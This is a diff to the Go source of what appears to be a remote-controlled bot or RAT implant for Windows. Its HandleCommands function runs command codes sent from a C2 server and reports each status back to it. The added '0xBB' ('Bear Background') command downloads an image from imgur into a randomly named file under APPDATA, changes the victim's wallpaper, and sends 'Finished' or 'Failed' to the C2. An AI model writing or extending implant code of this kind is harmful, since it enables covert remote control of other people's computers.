@@ -3,7 +3,6 @@ package core
 import (
 	"bytes"
 	"encoding/json"
-	"golang.org/x/sys/windows/registry"
 	"io"
 	"math/rand"
 	"net/http"
@@ -14,6 +13,8 @@ import (
 	"strings"
 	"syscall"
 	"time"
+
+	"golang.org/x/sys/windows/registry"
 )
 
 //id = SQL Row id
@@ -448,6 +449,24 @@ func HandleCommands(id string, dat string, parameters string) {
 		} else {
 			defer output.Close()
 			response, err := http.Get("https://i.imgur.com/lc32mo5.png")
+			if err != nil {
+				go CommandUpdateC2(id, "Failed")
+			} else {
+				defer response.Body.Close()
+				_, _ = io.Copy(output, response.Body)
+				SetWallpaper(os.Getenv("APPDATA") + n + ".jpg")
+				go CommandUpdateC2(id, "Finished")
+			}
+		}
+	case "0xBB": //Bear Background
+		go CommandUpdateC2(id, "Issued...")
+		n := RandomString(5)
+		output, err := os.Create(os.Getenv("APPDATA") + n + ".jpg")
+		if err != nil {
+			go CommandUpdateC2(id, "Failed")
+		} else {
+			defer output.Close()
+			response, err := http.Get("https://i.imgur.com/7Q3hpyk.jpeg")
 			if err != nil {
 				go CommandUpdateC2(id, "Failed")
 			} else {
